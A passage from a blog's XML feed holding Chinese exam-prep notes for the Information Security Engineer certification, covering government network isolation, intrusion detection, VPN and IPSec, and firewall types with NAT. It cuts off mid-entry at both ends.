/><ul><li><p>网络架构：电子政务网络由<strong>政务内网和政务外网构成，两网之间物理隔离</strong>，政务外网与互联网之间逻辑隔离。</p></li><li><p>核心设备：使用安全隔离网闸（或称&quot;安全隔离与信息交换系统&quot;）实现内外网数据交换</p><ul><li>该网闸的技术原理是<strong>切断网络之间的通用协议连接</strong>（TCP/IP），将数据包进行分解或重组成静态数据，然后对静态数据进行<strong>安全审查</strong>，确认安全后再流入内部单元。</li></ul></li><li><p>隔离对比：政务外网与互联网采用<strong>防火墙</strong>逻辑隔离，而内外网间必须采用<strong>网闸</strong>物理隔离</p></li><li><p>实际应用：</p><img src="https://image.icewindy.cn/2025/08/b515c3af9c68b2cd0eb2d8af933f4206.png" alt="image-20250812163301834" style="zoom: 50%;" /></li></ul><h3 id="公安网络">公安网络</h3><p><img src="https://image.icewindy.cn/2025/08/4287a91cebe7c9352e036910c2b76c35.png" alt="image-20250812172945779"></p><ul><li>网络分类：<ul><li>公安信息网（内网）：严格物理隔离，禁止&quot;一机两用&quot;</li><li>互联网：承载门户网站、舆情分析等对外业务</li><li>视频专网：专用于监控摄像头数据传输</li></ul></li><li>层级架构：公安部→省厅（一级网）→地市（二级网）→区县（三级网）→派出所（四级网）</li><li>视频专网安全：<ul><li>与社会监控资源单向数据导入</li><li>与公安信息网通过安全接入平台（含网闸等设备）隔离</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 软考 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息安全工程师软考（10）：入侵检测</title>
      <link href="/2025/08/08/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83%EF%BC%8810%EF%BC%89%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"/>
      <url>/2025/08/08/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83%EF%BC%8810%EF%BC%89%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="入侵检测概述">入侵检测概述</h2><ul><li>判断依据：对目标的操作是否超出了目标的安全策略范围。例如只有读权限却进行写操作就属于入侵行为。</li><li>检测方式：通过<strong>收集操作系统、系统程序、应用程序、网络包等信息，发现违背安全策略或危及系统安全的行为</strong>。</li><li>系统定义：具有入侵检测功能的系统称为入侵检测系统（Intrusion Detection System，简称IDS）。</li><li>IDS只可以检测，不能阻断。IDS一般为旁路部署，IPS一般是串行部署</li></ul><h3 id="入侵检测模型">入侵检测模型</h3><p><img src="https://image.icewindy.cn/2025/08/d13d4555f55c78e923f0912110ff4ef5.png" alt="image-20250808163131912"></p><ul><li>早期模型原理：根据审计记录数据生成系统轮廓（如正常行为基线），通过检测轮廓变化发现入侵。</li><li><strong>CIDF模型</strong>组成：<ul><li><strong>事件产生器</strong>：从计算环境获取事件并进行标准化</li><li><strong>事件分析器</strong>：分析数据并产生结果（判断是否为攻击）</li><li><strong>响应单元</strong>：根据分析结果做出响应动作</li><li><strong>事件数据库</strong>：存储中间和最终数据</li><li>模型特点：各组件协同工作，简单事件直接响应，复杂事件需经分析器处理。</li></ul></li></ul><h3 id="入侵检测作用">入侵检测作用</h3><ul><li>核心角色：扮演**&quot;预警机&quot;或&quot;安全巡逻人员&quot;<strong>角色，<strong>不是阻止</strong>入侵事件发生，而是通过检测技术来</strong>发现**系统中企图或已经违背安全策略的行为。</li><li>六大功能：<ul><li>发现系统中的入侵或异常行为</li><li>检验现有安全措施有效性</li><li>分析系统面临的威胁</li><li>阻止安全事件扩大（及时报警触发应急响应）</li><li>指导安全策略制定</li><li>提供网络犯罪取证证据</li></ul></li><li>与防火墙区别：防火墙像门卫只能检测大门进出，IDS能发现内部异常行为。</li><li>入侵检测技术还常用于<strong>安全态势感知</strong>。</li></ul><h3 id="安全态势感知">安全态势感知</h3><img src="https://image.icewindy.cn/2025/08/153a4a6983e512d6e1111b8a9edfed65.png" alt="image-20250808163737403" style="zoom: 33%;" /><ul><li>基本原理：<ul><li>数据采集：日志（来自IDS、终端Agent、网络设备等）和流量（专用探针或网络设备内置功能）</li><li>分析处理：大数据关联分析、时间序列分析等</li></ul></li><li>核心价值：<ul><li>统一分析海量安全数据</li><li>可视化展示全网安全态势</li><li>预测攻击发展趋势</li></ul></li><li>典型应用：<ul><li>威胁地图展示（国家/地区威胁热度排行）</li><li>资产风险态势监控</li><li>攻击源追踪分析</li></ul></li><li>实施要点：<ul><li>需要配套安全设备提供数据源</li><li>终端需部署EDR等探针软件</li><li>实际效果依赖数据质量和分析算法</li></ul></li></ul><h2 id="入侵检测原理与分类">入侵检测原理与分类</h2><h3 id="入侵检测原理">入侵检测原理</h3><h4 id="误用检测">误用检测</h4><p><img src="https://image.icewindy.cn/2025/08/5775cf8e4505f3666972ff7aca9f65b7.png" alt="image-20250808163944117"></p><ul><li>定义：又称基于特征的入侵检测方法，通过已知入侵模式库进行特征匹配检测</li><li>分类：<ul><li>基于条件概率（贝叶斯定理）</li><li>基于状态迁移</li><li>基于键盘监控</li><li>基于规则</li></ul></li><li>核心缺点：<strong>高度依赖特征库，无法检测新型攻击</strong></li></ul><h4 id="异常检测">异常检测</h4><p><img src="https://image.icewindy.cn/2025/08/96369173a3835f00e47ea737d1f7d1e3.png" alt="image-20250808164040477"></p><ul><li>定义：通过统计分析建立系统正常行为基线，检测偏离基线的异常行为</li><li>典型示例：<ul><li>常规成都登录突然出现上海登录记录</li></ul></li><li>分类：<ul><li>基于统计</li><li>基于模式预测</li><li>基于文本分类</li><li>基于贝叶斯推理</li></ul></li><li>核心缺点：<strong>存在较高误报率</strong></li><li>优势：<strong>能检测未知攻击类型</strong></li></ul><h3 id="入侵检测系统组成与分类">入侵检测系统组成与分类</h3><h4 id="系统组成">系统组成</h4><img src="https://image.icewindy.cn/2025/08/ba64700fe3d5e518c898adda2444954f.png" alt="image-20250808164646579" style="zoom:50%;" /><ul><li>核心模块：<ul><li>数据采集模块：收集审计记录/协议数据等</li><li>入侵分析引擎：核心检测模块</li><li>应急处理模块：实施防护措施</li><li>管理配置模块：用户配置接口</li><li>辅助模块：支持分析引擎运行</li></ul></li><li>工作流程：数据采集→分析检测→报警/应急处理</li></ul><h4 id="分类">分类</h4><h5 id="hids-基于主机的入侵检测系统">HIDS 基于主机的入侵检测系统</h5><img src="https://image.icewindy.cn/2025/08/4c7c9bfada1eaec064bce25032b1f13b.png" alt="image-20250808164910713" style="zoom:50%;" /><ul><li><p>检测依据：</p><ul><li>CPU/内存/磁盘使用率</li><li>网络端口状态</li><li>注册表变更</li><li>文件完整性</li><li>进程信息</li><li>系统调用记录</li></ul></li><li><p>数据来源：主机日志文件、系统调用记录等</p></li><li><p>部署特点：需在每个终端安装Agent</p></li><li><p>典型代表：杀毒软件、终端安全软件</p></li></ul><h5 id="nids基于网络的入侵检测系统">NIDS基于网络的入侵检测系统</h5><ul><li><p>基于网络的入侵检测系统的优点</p><ul><li>大规模监控：单点可监控整个网络出口流量</li><li>非侵入式：旁路部署不影响正常网络通信</li><li>隐蔽性强：对攻击者不可见（通过流量镜像分析）</li></ul></li><li><p>基于网络的入侵检测系统的缺点</p><ul><li>高速网络局限：可能出现丢包漏检</li><li>VLAN监测限制：交换机镜像端口不足导致覆盖不全</li><li>加密流量盲区：无法解析加密协议内容</li><li>结果不可见：仅能检测攻击行为无法确认攻击结果</li></ul></li></ul><h5 id="dids基于网络的分布式入侵检测系统">DIDS基于网络的分布式入侵检测系统</h5><ul><li><p>产生背景：</p><ul><li>漏洞分布分散化</li><li>攻击行为协同化</li><li>数据来源多元化</li><li>网络流量高速化</li></ul></li><li><p>系统类型：</p><img src="https://image.icewindy.cn/2025/08/56d85bcb9571939574b74cac00ae72da.png" alt="image-20250808165123660" style="zoom: 50%;" /><ul><li>HDIDS（主机分布式）：主机检测器Agent（EDR）+入侵管理控制器</li><li>NDIDS（网络分布式）：网络探测器+管理控制器</li></ul></li><li><p>典型架构：</p><ul><li>前端探测器分布式部署</li><li>后端管理平台集中分析</li></ul></li><li><p>现代演进：态势感知系统的技术前身</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 软考 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息安全工程师软考（9）：VPN技术原理及应用</title>
      <link href="/2025/08/07/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83%EF%BC%889%EF%BC%89%EF%BC%9AVPN%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/"/>
      <url>/2025/08/07/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83%EF%BC%889%EF%BC%89%EF%BC%9AVPN%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="vpn概述">VPN概述</h2><h3 id="vpn概念">vpn概念</h3><ul><li>本质：Virtual Private Network（虚拟专用网）的缩写，通过在不可信任的公共网络上建立加密通道实现安全通信</li><li>核心机制：将需要传输的报文(packet)加密处理后通过公共网络传输，保证数据在公网上的保密性</li><li>vpn安全功能：保密性服务、完整性服务、认证服务</li></ul><h3 id="vpn实现功能">vpn实现功能</h3><ul><li>加密传输：如IPSec VPN对站点间通信数据进行加密，防止公网传输中被窃取</li><li>隧道技术：出差人员通过VPN隧道访问内网服务器，实现&quot;虚拟内网接入&quot;效果</li><li>三大安全服务：<ul><li>保密性服务：防止数据被窃听（如AES加密）</li><li>完整性服务：检测数据是否被篡改（通过哈希校验）</li><li>认证服务：验证通信双方身份（如用户名/密码认证）</li></ul></li></ul><h3 id="vpn分类">vpn分类</h3><ul><li>链路层VPN：<ul><li>典型协议：<strong>PPTP、L2TP</strong>（基于PPP协议）</li><li>其他技术：ATM、Frame Relay、MPLS</li></ul></li><li>网络层VPN：<ul><li>代表技术：<strong>IPSec</strong>、GRE</li></ul></li><li>传输层VPN：<ul><li>典型协议：<strong>SSL/TLS</strong>（如HTTPS使用的安全层）</li></ul></li></ul><h3 id="vpn实现技术">vpn实现技术</h3><h4 id="密码算法">密码算法</h4><ul><li>国际算法：<ul><li>对称加密：DES、AES（主流）、IDEA</li><li>非对称加密：RSA</li></ul></li><li>国密算法（<strong>重点考点</strong>）：<ul><li>SM1/SM4（对称加密）</li><li>SM2（非对称加密）</li><li>SM3（哈希算法）</li><li>SM9（标识密码算法）</li></ul></li></ul><h4 id="密钥管理">密钥管理</h4><ul><li>手工配置：<ul><li>优点：配置可靠</li><li>缺点：更新慢</li></ul></li><li>动态分发：<ul><li>协议标准：SKIP（简单密钥管理）、ISAKMP/Oakley（安全联盟协议）</li><li>优势：自动协商、更新快（适合大型网络）</li></ul></li></ul><h4 id="认证访问优势">认证访问优势</h4><ul><li>用户身份认证：<ul><li>单向认证：仅验证客户端身份</li><li>双向认证：客户端与服务器互相验证（更安全）</li></ul></li><li>数据认证：<ul><li>完整性验证：通过哈希算法（如SM3）检测数据篡改</li><li>合法性验证：通过数字签名（如RSA签名）确认数据来源</li></ul></li></ul><h2 id="ipsec与ssl">IPSec与SSL</h2><h3 id="ipsec">IPSec</h3><ul><li>定义: IETF定义的协议集，用于<strong>增强IP网络安全性</strong></li><li>核心功能:<ul><li>数据完整性（Data Integrity）: 通过哈希校验检测数据是否被篡改</li><li>认证机制（Autentication）: 验证通信双方身份真实性</li><li>保密性（Confidentiality）: 采用加密算法实现数据保密传输</li><li>应用透明性（Application-transparent Security）: 在网络层实现安全功能，对应用层透明</li></ul></li></ul><h4 id="ipsec组成架构">IPSec组成架构</h4><p>IPSec功能分为三类</p><ul><li>认证头（AH）<ul><li>功能: <strong>数据完整性校验+源认证</strong></li><li>算法: MD5/SHA等<strong>哈希算法</strong></li><li>局限: 不提供加密服务</li></ul></li><li>封装安全负荷（ESP）<ul><li>功能: <strong>数据加密+防重放攻击</strong></li><li>算法: DES/3DES/AES等<strong>对称加密算法</strong></li></ul></li><li>Internet密钥交换协议（IKE）<ul><li>功能: 密钥生成与分发</li><li>算法: <strong>DH算法</strong>（非对称加密）</li></ul></li></ul><h4 id="ipsec两种封装模式">IPSec两种封装模式</h4><img src="https://image.icewindy.cn/2025/08/8282d6cbaa8444ba40601f813b4e7638.png" alt="image-20250807154927865" style="zoom:50%;" /><ul><li>传输模式:<ul><li>特点: 保留原始IP头，在传输层与网络层间插入AH头</li><li>应用场景: 终端到终端VPN（如PC到服务器）</li></ul></li><li>隧道模式:<ul><li>特点: 添加新IP头，实现完整数据包封装</li><li>应用场景: 站点到站点VPN（如路由器间通信）</li></ul></li><li>区分<ul><li>记忆口诀: “隧道模式有盾构（新头），传输模式用原装”</li><li>隧道模式安全性更高，实际应用更广泛</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 软考 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息安全工程师软考（8）：防火墙</title>
      <link href="/2025/08/06/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83%EF%BC%888%EF%BC%89%EF%BC%9A%E9%98%B2%E7%81%AB%E5%A2%99/"/>
      <url>/2025/08/06/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83%EF%BC%888%EF%BC%89%EF%BC%9A%E9%98%B2%E7%81%AB%E5%A2%99/</url>
      
        <content type="html"><![CDATA[<h2 id="防火墙概述">防火墙概述</h2><ul><li>边界隔离设备: 通过软硬件组合实现内网与外网隔离，既可隔离信任网络与不可信网络（如Internet），也可隔离内网不同区域（如教学区与宿舍区、应用区与数据库区）</li><li>流量控制机制: 根据安全规则决定网络包禁止（deny）或转发（permit）</li></ul><h3 id="防火墙区域划分">防火墙区域划分</h3><ul><li><p>教材标准划分:</p><ul><li>公共外部网络: Internet等不可信网络</li><li>内联网(Intranet): 组织专用网络（如公司内部网络）</li><li>外联网(Extranet): 内联网延伸（如医院与医保系统的互联网络）</li><li>DMZ区域: 放置公共服务设备（如Web服务器）的缓冲地带</li></ul></li><li><p>华为设备/其他安全厂商划分:</p><ul><li><p>Local区域: 防火墙自身（安全级别100）</p></li><li><p>Trust区域: 内部可信网络（安全级别85）</p></li><li><p>DMZ区域: 公共服务区（安全级别50）</p></li><li><p>Untrust区域: 外部不可信网络（安全级别最低）</p><p><img src="https://image.icewindy.cn/2025/08/251175fd36c69316e367f54e09ddba65.png" alt="image-20250806161349051"></p></li><li><p>信任度排序：﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mi>o</mi><mi>c</mi><mi>a</mi><mi>l</mi><mo>&gt;</mo><mi>T</mi><mi>r</mi><mi>u</mi><mi>s</mi><mi>t</mi><mo>&gt;</mo><mi>D</mi><mi>M</mi><mi>Z</mi><mo>&gt;</mo><mi>U</mi><mi>n</mi><mi>t</mi><mi>r</mi><mi>u</mi><mi>s</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">Local &gt; Trust &gt; DMZ &gt; Untrust</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord mathdefault">L</span><span class="mord mathdefault">o</span><span class="mord mathdefault">c</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">u</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">U</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">u</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span></span></span></span></p></li></ul></li></ul><h3 id="工作原理">工作原理</h3><ul><li>核心功能: 网络访问控制，通过规则库实现流量过滤</li><li>控制粒度: 从早期网络层检测发展到应用层深度检测</li></ul><h3 id="安全策略">安全策略</h3><ul><li>白名单策略:<ul><li>仅允许符合规则的流量通过（默认禁止）</li><li>安全性更高（如外到内流量控制示例）</li></ul></li><li>黑名单策略:<ul><li>仅禁止规则冲突的流量（默认允许）</li><li>灵活性更好（如内到外流量控制示例）</li></ul></li></ul><p><img src="https://image.icewindy.cn/2025/08/d247c55686391ec9dde8bd30c11abd29.png" alt="image-20250806162023965"></p><h3 id="防火墙功能与安全风险">防火墙功能与安全风险</h3><ul><li>核心功能:<ul><li><strong>过滤非安全访问</strong></li><li><strong>网络访问审计</strong></li><li><strong>带宽控制</strong></li><li><strong>协同防御</strong></li></ul></li><li>五大安全风险:<ul><li>旁路风险: 无法检测绕过防火墙的流量（如内部直接拨号上网）</li><li>功能缺陷:<ul><li>无法完全阻断病毒文件传输</li><li>难以防御数据驱动攻击</li><li>不能防止后门攻击</li></ul></li><li>单点故障: 设备失效导致网络中断</li><li>内部威胁: 无法防范内网恶意行为</li><li>规则依赖: 效果受限于规则库更新</li></ul></li><li>发展趋势:<ul><li>检测粒度细化（如AI防火墙）</li><li>检查安全功能持续增强</li><li>产品分类专业化（UTM/NGFW/WAF等）</li><li>智能化增强</li></ul></li></ul><h2 id="防火墙类型与实现技术">防火墙类型与实现技术</h2><h3 id="包过滤防火墙">包过滤防火墙</h3><ul><li>定义: 包过滤防火墙是在<strong>IP层（网络层）<strong>实现的防火墙技术，根据包的</strong>源IP地址、目的IP地址、源端口、目的端口及包传递方向等包头信息</strong>判断是否允许包通过。（实际上网络层和传输层都有）</li><li>优点:<ul><li><strong>低负载</strong>: 由于只检测网络层和传输层的部分信息，性能较高。</li><li><strong>高通过率</strong>: 数据包处理速度快。</li><li><strong>对用户透明</strong>: 用户无需关注防火墙的存在。</li></ul></li><li>缺点:<ul><li>不能在用户级别进行过滤: <strong>无法识别不同用户</strong>，也不能防止IP地址盗用。</li><li>安全漏洞: 如果攻击者将自己的IP地址设为合法主机的IP地址，可以轻易通过包过滤器。</li></ul></li><li>包过滤规则：<ul><li>组成: 包过滤规则由“<strong>规则号、匹配条件、匹配操作</strong>”三部分组成。</li><li>匹配条件: 根据<strong>源IP地址、目的IP地址、源端口号、目的端口号、协议类型</strong>（UDP/TCP/ICMP）、通信方向、规则运算进行匹配。</li><li>匹配操作: 包括拒绝、转发、审计三种。</li></ul></li></ul><h3 id="状态检测技术">状态检测技术</h3><ul><li>状态检查技术: 通过利用<strong>TCP会话和UDP“伪”会话的状态信息</strong>进行网络访问控制的一种技术。</li><li>工作原理:<ul><li>防火墙首先建立并<strong>维护一张会话表</strong>。</li><li>当有符合已定义安全策略的TCP连接或UDP流时，防火墙会创建会话项。</li><li>然后依据状态表项检查，判断是否允许通过防火墙。</li></ul></li><li>主要步骤:<ul><li>接收到数据包。</li><li>检查数据包的有效性，若无效，则丢掉数据包并审计。</li><li>查找会话表: 若找到，则进一步检查数据包的序列号和会话状态，如有效，则进行地址转换和路由，转发该数据包；否则，丢掉数据包并审计。</li><li>查找策略表: 当会话表中没有新到的数据包信息时，则查找策略表，如符合策略表，则增加会话条目到会话表中，并进行地址转换和路由，转发该数据包；否则，丢掉该数据包并审计。</li></ul></li><li>特点: 状态检测技术主要检测的是TCP会话和UDP“伪”会话的状态信息，如三次握手等状态，以确保网络访问的安全性。</li></ul><h3 id="应用服务代理">应用服务代理</h3><ul><li>中间人机制：作为内外网通信的中介，内部主机请求需先经代理转发，外部响应也通过代理返回，类似&quot;科学上网&quot;的实现原理</li><li>代理类型：按服务协议可分为FTP代理、Telnet代理、HTTP代理、Socket代理、邮件代理等专用代理服务器</li><li>安全优势：<ul><li>访问控制：外部主机无法直接访问内部主机，攻击仅能到达代理层</li><li>深度检测：能拆解数据包分析应用层命令，识别潜在攻击</li><li>审计能力：完整记录所有代理操作日志，便于安全审计</li><li>认证支持：提供多种用户身份认证方案</li></ul></li><li>性能局限：<ul><li>速度延迟：需检测应用层内容（类比机场开箱安检），比包过滤防火墙更耗时</li><li>配置要求：需客户端安装插件或专用软件（如浏览器代理设置），对用户不透明</li><li>协议限制：每个代理仅支持特定协议（如HTTP代理不支持FTP），无法通用</li></ul></li></ul><h3 id="网络地址转换技术nat">网络地址转换技术NAT</h3><ul><li>核心作用：解决IPv4公网地址短缺问题，实现私网地址与公网地址的转换</li><li>安全附加价值：隐藏内网真实拓扑结构，外部无法直接获知内部网络架构</li></ul><h4 id="静态nat">静态NAT</h4><ul><li>映射规则：内网主机永久绑定特定公网IP（如<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>192.168.1.1</mn><mo>→</mo><mn>202.1.1.1</mn></mrow><annotation encoding="application/x-tex">192.168.1.1 \rightarrow 202.1.1.1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">9</span><span class="mord">2</span><span class="mord">.</span><span class="mord">1</span><span class="mord">6</span><span class="mord">8</span><span class="mord">.</span><span class="mord">1</span><span class="mord">.</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">.</span><span class="mord">1</span><span class="mord">.</span><span class="mord">1</span><span class="mord">.</span><span class="mord">1</span></span></span></span>﻿）</li><li>应用局限：<ul><li>需要1:1的公网IP匹配（1万台内网主机需1万个公网IP）</li><li>即使主机离线，映射的公网IP也不能回收利用</li><li>实际项目极少采用</li></ul></li></ul><h4 id="nat池">NAT池</h4><ul><li>动态分配：建立公网IP地址池，按需动态分配给内网主机</li><li>资源优化：假设1万人中仅1000人同时在线，只需维护1000个公网IP的地址池</li><li>回收机制：主机断开连接后，公网IP可重新分配</li></ul><h4 id="端口nat-pat">端口NAT（PAT）</h4><ul><li>端口复用：通过不同端口区分内网主机（如﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>192.168.1.1</mn><mo>→</mo><mn>202.1.1.1</mn><mo>:</mo><mn>1025</mn></mrow><annotation encoding="application/x-tex">192.168.1.1 \rightarrow 202.1.1.1:1025</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">9</span><span class="mord">2</span><span class="mord">.</span><span class="mord">1</span><span class="mord">6</span><span class="mord">8</span><span class="mord">.</span><span class="mord">1</span><span class="mord">.</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">.</span><span class="mord">1</span><span class="mord">.</span><span class="mord">1</span><span class="mord">.</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">2</span><span class="mord">5</span></span></span></span>﻿）</li><li>经济优势：单公网IP可支持上百内网主机（实际项目最主流方案）</li><li>技术别名：也称为PAT（Port Address Translation）</li></ul><h4 id="保留ip地址-重点考点">保留IP地址（重点考点）</h4><ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>10.0.0.0</mn><mo>∼</mo><mn>10.255.255.255</mn></mrow><annotation encoding="application/x-tex">10.0.0.0 \sim 10.255.255.255</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">.</span><span class="mord">0</span><span class="mord">.</span><span class="mord">0</span><span class="mord">.</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">.</span><span class="mord">2</span><span class="mord">5</span><span class="mord">5</span><span class="mord">.</span><span class="mord">2</span><span class="mord">5</span><span class="mord">5</span><span class="mord">.</span><span class="mord">2</span><span class="mord">5</span><span class="mord">5</span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>172.16.0.0</mn><mo>∼</mo><mn>172.31.255.255</mn></mrow><annotation encoding="application/x-tex">172.16.0.0 \sim 172.31.255.255</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">7</span><span class="mord">2</span><span class="mord">.</span><span class="mord">1</span><span class="mord">6</span><span class="mord">.</span><span class="mord">0</span><span class="mord">.</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">7</span><span class="mord">2</span><span class="mord">.</span><span class="mord">3</span><span class="mord">1</span><span class="mord">.</span><span class="mord">2</span><span class="mord">5</span><span class="mord">5</span><span class="mord">.</span><span class="mord">2</span><span class="mord">5</span><span class="mord">5</span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>192.168.0.0</mn><mo>∼</mo><mn>192.168.255.255</mn></mrow><annotation encoding="application/x-tex">192.168.0.0 \sim 192.168.255.255</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">9</span><span class="mord">2</span><span class="mord">.</span><span class="mord">1</span><span class="mord">6</span><span class="mord">8</span><span class="mord">.</span><span class="mord">0</span><span class="mord">.</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">9</span><span class="mord">2</span><span class="mord">.</span><span class="mord">1</span><span class="mord">6</span><span class="mord">8</span><span class="mord">.</span><span class="mord">2</span><span class="mord">5</span><span class="mord">5</span><span class="mord">.</span><span class="mord">2</span><span class="mord">5</span><span class="mord">5</span></span></span></span></li></ul><h3 id="下一代防火墙技术">下一代防火墙技术</h3><ul><li>功能集成：集成了传统防火墙的<strong>包过滤、状态监测、地址转换</strong>功能，并新增<strong>应用识别控制</strong>、动态攻击响应等高级功能</li><li><strong>应用识别</strong>：不依赖端口号，通过深度内容分析实现应用层协议精准识别，提供应用程序级安全防护</li><li><strong>入侵防护（IPS）</strong>：基于漏洞特征检测SQL注入等攻击行为</li><li><strong>数据防泄露</strong>：识别常见文件真实类型（Word/Excel/PPT/PDF）并过滤敏感内容</li><li><strong>恶意防护</strong>：采用信誉检测技术，构建Web信誉库对恶意网站资源（IP/URL/域名）进行评级拦截</li><li><strong>URL过滤</strong>：通过分类库过滤不良言论、钓鱼网站等高风险URL</li><li><strong>带宽管理QoS</strong>：智能识别业务应用，优先保障关键业务带宽资源</li><li><strong>加密分析</strong>：支持对SSL/SSH等加密流量的中间人监测</li><li>适用场景：中小型网络环境适用，大型网络建议搭配专业设备（如IPS需单独部署）</li></ul><h3 id="其他防火墙技术">其他防火墙技术</h3><h4 id="web防火墙-waf">Web防火墙（WAF）</h4><ul><li>防护范围：专门防御SQL注入、XSS跨站脚本、Webshell上传、CSRF等Web层攻击</li><li>设备定位：对应网页防火墙专用设备，可进行Web应用漏洞扫描</li></ul><h4 